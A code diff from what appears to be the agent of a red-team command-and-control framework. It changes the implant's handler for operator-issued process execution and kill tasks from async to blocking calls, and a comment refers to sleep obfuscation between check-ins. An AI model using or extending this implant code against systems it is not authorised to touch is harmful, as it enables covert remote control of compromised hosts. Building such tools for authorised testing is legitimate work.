@@ -4,12 +4,11 @@ use std::collections::BTreeMap;
 use std::ffi::OsString;
 use std::fs;
 use std::path::{Path, PathBuf};
-use std::process::Stdio;
+use std::process::{Command, Stdio};
 
 use std::os::unix::fs::MetadataExt;
 
 use red_cell_common::demon::{DemonCommand, DemonProcessCommand};
-use tokio::process::Command;
 
 use crate::error::PhantomError;
 use crate::parser::TaskParser;
@@ -131,14 +130,22 @@ pub(super) async fn execute_process(
                     command.args(split_args(&process_args));
                 }
             }
+            // Detach child stdin — when the agent is launched with stdin connected to a pipe
+            // or TTY, inherited stdin can leave `/bin/sh -c …` waiting on read (scenario-07
+            // `kill <pid>` would hang until CLI exec wait times out).
+            command.stdin(Stdio::null());
             if piped {
+                // Use `std::process` (blocking) instead of `tokio::process`: production Phantom
+                // runs on a `current_thread` runtime and uses mprotect between check-ins.
+                // Tokio's async child driver installs global reaper state; keeping subprocess
+                // execution purely synchronous avoids subtle interactions with that machinery
+                // and the sleep obfuscation path (red-cell-c2-1f7q1).
                 command.stdout(Stdio::piped()).stderr(Stdio::piped());
                 let child =
                     command.spawn().map_err(|error| PhantomError::Process(error.to_string()))?;
-                let pid = child.id().unwrap_or_default();
+                let pid = child.id();
                 let output = child
                     .wait_with_output()
-                    .await
                     .map_err(|error| PhantomError::Process(error.to_string()))?;
                 // Suppress verbose banner when piped — the banner would be
                 // persisted as a separate output entry that shadows the actual
@@ -171,13 +178,7 @@ pub(super) async fn execute_process(
                 state.queue_callback(PendingCallback::Structured {
                     command_id: u32::from(DemonCommand::CommandProc),
                     request_id,
-                    payload: encode_proc_create(
-                        &binary,
-                        child.id().unwrap_or_default(),
-                        true,
-                        false,
-                        verbose,
-                    )?,
+                    payload: encode_proc_create(&binary, child.id(), true, false, verbose)?,
                 });
             }
         }
@@ -185,10 +186,10 @@ pub(super) async fn execute_process(
             let pid = u32::try_from(parser.int32()?)
                 .map_err(|_| PhantomError::TaskParse("negative pid"))?;
             let success = Command::new("kill")
+                .stdin(Stdio::null())
                 .arg("-9")
                 .arg(pid.to_string())
                 .status()
-                .await
                 .map_err(|error| PhantomError::Process(error.to_string()))?
                 .success();
             state.queue_callback(PendingCallback::Structured {
